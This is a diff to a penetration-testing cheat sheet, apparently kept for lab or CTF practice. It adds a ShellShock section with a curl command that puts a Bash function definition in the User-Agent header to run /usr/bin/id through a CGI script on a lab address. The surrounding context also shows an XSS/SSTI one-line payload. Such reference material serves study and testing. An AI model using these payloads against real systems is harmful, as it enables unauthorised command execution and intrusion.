@@ -81,6 +81,7 @@
   - [snap](#snap)
   - [SMTP](#smtp)
   - [SQLi+XSS+SSTI](#sqli-xss-ssti)
+  - [ShellShock](#shellshock)
 -------------------------------------------------------------------------------------------------------------
 # Basic Enumeration
 
@@ -1658,6 +1659,12 @@ sudo apt install evolution
 `one line payload`
 ```
 <svg/onload="alert('xss');">{{7*7}}</svg>
+```
+
+### ShellShock
+`exploit by curl`
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /usr/bin/id' bash -s :'' http://10.10.10.56/cgi-bin/user.sh
 ```
 ----------------------------------------------------------------------------------------------------------
 
